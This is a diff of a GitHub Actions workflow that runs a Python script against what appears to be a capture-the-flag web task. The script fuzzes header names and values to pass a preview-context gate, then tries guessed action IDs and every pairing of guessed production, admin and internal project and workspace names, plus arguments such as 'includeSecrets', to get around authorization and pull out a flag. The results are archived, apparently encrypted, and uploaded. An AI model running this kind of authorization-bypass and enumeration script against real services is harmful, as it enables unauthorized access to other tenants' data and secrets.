@@ -12,7 +12,7 @@ jobs:
     runs-on: ubuntu-latest
     timeout-minutes: 5
     steps:
-      - name: Isolate exact preview-context header and inspect action arguments
+      - name: Probe valid preview header across deploy targets
         shell: bash
         run: |
           set -euo pipefail
@@ -30,39 +30,53 @@ jobs:
           -----END PUBLIC KEY-----
           PEM
           python3 - <<'PY'
-          import requests, pathlib, urllib.parse, json
+          import requests, pathlib, urllib.parse, json, itertools
           base='https://task-launchlet-web-medium-18cf6be4db586bb6.caplag-task.ru/'
-          out=pathlib.Path('package/out'); s=requests.Session(); s.headers['User-Agent']='Mozilla/5.0'
-          boot=s.get(urllib.parse.urljoin(base,'/api/app/bootstrap'),timeout=15).json(); mf=s.get(urllib.parse.urljoin(base,boot['api']['buildManifest']),timeout=15).json(); refs=s.get(urllib.parse.urljoin(base,boot['api']['serverReferences']),timeout=15).json(); act=refs['serverActions']['inspectDeploy']
-          url=urllib.parse.urljoin(base,act['endpoint']); project=boot['project']; workspace=boot['workspace']
+          out=pathlib.Path('package/out')
+          s=requests.Session(); s.headers['User-Agent']='Mozilla/5.0'
+          boot=s.get(urllib.parse.urljoin(base,'/api/app/bootstrap'),timeout=15).json()
+          mf=s.get(urllib.parse.urljoin(base,boot['api']['buildManifest']),timeout=15).json()
+          refs=s.get(urllib.parse.urljoin(base,boot['api']['serverReferences']),timeout=15).json()
+          act=refs['serverActions']['inspectDeploy']; url=urllib.parse.urljoin(base,act['endpoint'])
+          H='X-Launchlet-Preview'; public_project=boot['project']; public_ws=boot['workspace']
           baseh={'Accept':'application/json','Content-Type':'application/json'}
-          names=[
-            'X-Launchlet-Preview','X-Launchlet-Context','X-Launchlet-Preview-Context','X-Launchlet-Client','X-Launchlet-Client-Context','X-Launchlet-Client-Mode','X-Launchlet-Preview-Mode','X-Launchlet-Session','X-Launchlet-Preview-Session','X-Launchlet-Runtime','X-Launchlet-Runtime-Context','X-Launchlet-Source','X-Launchlet-Preview-Source','X-Launchlet-Request-Context','X-Launchlet-Request','X-Launchlet-Preview-Request','X-Launchlet-Studio','X-Launchlet-Studio-Context','X-Launchlet-Environment','X-Launchlet-Preview-Environment','X-Launchlet-Stage','X-Launchlet-Role','X-Launchlet-Preview-Role','X-Launchlet-Mode','X-Launchlet-Capability','X-Launchlet-Preview-Capability','X-Launchlet-Scope','X-Launchlet-Preview-Scope','X-Launchlet-Origin','X-Launchlet-Preview-Origin','X-Launchlet-Build','X-Launchlet-Project','X-Launchlet-Workspace','X-Launchlet-Server-Reference','X-Launchlet-Server-Context','X-Launchlet-Action','X-Launchlet-Action-Context','X-Launchlet-Deploy','X-Launchlet-Deploy-Context','X-Launchlet-Token','X-Launchlet-Preview-Token','X-Launchlet-Context-Token','X-Launchlet-Context-Id','X-Launchlet-Internal','X-Launchlet-Internal-Preview','X-Launchlet-Internal-Context','X-Launchlet-Live-Preview','X-Launchlet-Preview-Client','X-Launchlet-Preview-Runtime','X-Launchlet-Auth','X-Launchlet-Preview-Auth','X-Launchlet-Key','X-Launchlet-Preview-Key','Launchlet-Preview','Launchlet-Context','Launchlet-Preview-Context','Launchlet-Client','Launchlet-Client-Context','Launchlet-Client-Mode','Launchlet-Preview-Mode','Launchlet-Session','Launchlet-Preview-Session','Launchlet-Runtime','Launchlet-Runtime-Context','Launchlet-Source','Launchlet-Preview-Source','Launchlet-Request-Context','Launchlet-Request','Launchlet-Preview-Request','Launchlet-Studio'
-          ]
-          basebody={'actionId':act['id'],'args':{'workspaceId':workspace,'projectId':project}}
-          winners=[]
-          for h in names:
-              r=s.post(url,headers={**baseh,h:project},json=basebody,timeout=10,allow_redirects=False)
+          project_candidates=list(dict.fromkeys([
+            public_project,
+            'launchlet-release-board','launchlet-prod-board','launchlet-production-board','launchlet-staging-board','launchlet-internal-board','launchlet-corp-board','launchlet-corporate-board','launchlet-admin-board','launchlet-deploy-board','launchlet-control-board','launchlet-control-plane','launchlet-ops-board','launchlet-release','launchlet-prod','launchlet-production','launchlet-staging','launchlet-internal','launchlet-corporate','launchlet-admin','launchlet-deploy','launchlet-ops','launchlet-demo-release','launchlet-demo-prod','launchlet-demo-production','launchlet-demo-board-release','launchlet-demo-board-prod','launchlet-demo-board-production','launchlet-release-demo-board','launchlet-prod-demo-board','release','prod','production','staging','internal','admin','deploy','ops','corporate','corp','preview-8b11c'
+          ]))
+          workspace_candidates=list(dict.fromkeys([
+            public_ws,
+            'ws-launchlet-release','ws-launchlet-prod','ws-launchlet-production','ws-launchlet-staging','ws-launchlet-internal','ws-launchlet-private','ws-launchlet-admin','ws-launchlet-corp','ws-launchlet-corporate','ws-launchlet-deploy','ws-launchlet-ops','ws-launchlet-control','ws-launchlet-preview','ws-launchlet-demo','ws-release','ws-prod','ws-production','ws-internal','preview-8b11c'
+          ]))
+          header_candidates=list(dict.fromkeys(project_candidates + [public_ws,mf['previewReceipt'],mf['build'],act['id'],'preview-8b11c']))
+          result={'header_values':[],'target_hits':[],'action_tests':[]}
+          # Which values are accepted as preview context?
+          for hv in header_candidates:
+              r=s.post(url,headers={**baseh,H:hv},json={'actionId':act['id'],'args':{'workspaceId':public_ws,'projectId':public_project}},timeout=8,allow_redirects=False)
               if r.status_code!=403 or r.text.strip()!='{"error":"preview_context_required"}':
-                  winners.append({'header':h,'status':r.status_code,'body':r.text,'headers':dict(r.headers)})
-          result={'winners':winners,'arg_tests':[]}
-          # If exactly one usable header, probe argument trust boundary using only public values and returned deployRef.
-          good=next((x for x in winners if x['status']==200),None)
-          if good:
-              h=good['header']; first=json.loads(good['body']); deploy_ref=first.get('inspector',{}).get('deployRef')
-              tests=[
-                ('baseline',{'workspaceId':workspace,'projectId':project}),
-                ('empty',{}),('only_project',{'projectId':project}),('only_workspace',{'workspaceId':workspace}),
-                ('project_deployref',{'workspaceId':workspace,'projectId':deploy_ref}),('workspace_deployref',{'workspaceId':deploy_ref,'projectId':project}),
-                ('extra_deployRef',{'workspaceId':workspace,'projectId':project,'deployRef':deploy_ref}),('extra_ref',{'workspaceId':workspace,'projectId':project,'ref':deploy_ref}),
-                ('extra_build',{'workspaceId':workspace,'projectId':project,'build':mf['build']}),('extra_mode_deploy',{'workspaceId':workspace,'projectId':project,'mode':'deploy'}),
-                ('extra_export',{'workspaceId':workspace,'projectId':project,'export':True}),('extra_include',{'workspaceId':workspace,'projectId':project,'includeSecrets':True}),
-                ('project_empty',{'workspaceId':workspace,'projectId':''}),('workspace_empty',{'workspaceId':'','projectId':project}),
-                ('project_workspace',{'workspaceId':workspace,'projectId':workspace}),('workspace_project',{'workspaceId':project,'projectId':project}),
-              ]
-              for name,args in tests:
-                  r=s.post(url,headers={**baseh,h:project},json={'actionId':act['id'],'args':args},timeout=10,allow_redirects=False)
-                  result['arg_tests'].append({'name':name,'args':args,'status':r.status_code,'body':r.text,'headers':dict(r.headers)})
+                  result['header_values'].append({'value':hv,'status':r.status_code,'body':r.text})
+                  if 'caplag{' in r.text: break
+          # Try action-id behavior after the gate is open.
+          for aid in ['x','inspectDeploy','deploy','exportDeploy','inspect-deploy','act_inspectDeploy','act_6f4b9a2c1d0e8a71',mf['previewReceipt'],'preview-8b11c']:
+              r=s.post(url,headers={**baseh,H:public_project},json={'actionId':aid,'args':{'workspaceId':public_ws,'projectId':public_project}},timeout=8,allow_redirects=False)
+              result['action_tests'].append({'actionId':aid,'status':r.status_code,'body':r.text})
+              if 'caplag{' in r.text: break
+          # Cross-product of plausible project/workspace targets. Store only interesting differences.
+          baseline_ref='preview-8b11c'; baseline_status='preview-only'
+          stop=False
+          for ws,proj in itertools.product(workspace_candidates,project_candidates):
+              r=s.post(url,headers={**baseh,H:public_project},json={'actionId':act['id'],'args':{'workspaceId':ws,'projectId':proj}},timeout=8,allow_redirects=False)
+              txt=r.text
+              interesting=False; parsed=None
+              try:
+                  parsed=r.json(); ins=parsed.get('inspector',{}) if isinstance(parsed,dict) else {}
+                  if r.status_code!=200 or ins.get('status')!=baseline_status or ins.get('deployRef')!=baseline_ref or 'flag' in parsed or 'caplag{' in txt:
+                      interesting=True
+              except Exception:
+                  interesting=True
+              if interesting:
+                  result['target_hits'].append({'workspaceId':ws,'projectId':proj,'status':r.status_code,'body':txt})
+                  if 'caplag{' in txt: stop=True; break
           (out/'summary.json').write_text(json.dumps(result,indent=2))
           PY
           tar -C package/out -czf package/result.tgz .
@@ -79,6 +93,6 @@ jobs:
           rm -rf package
       - uses: actions/upload-artifact@v4
         with:
-          name: launchlet-part2-isolate-encrypted
+          name: launchlet-part2-targets-encrypted
           path: artifact/
           retention-days: 1
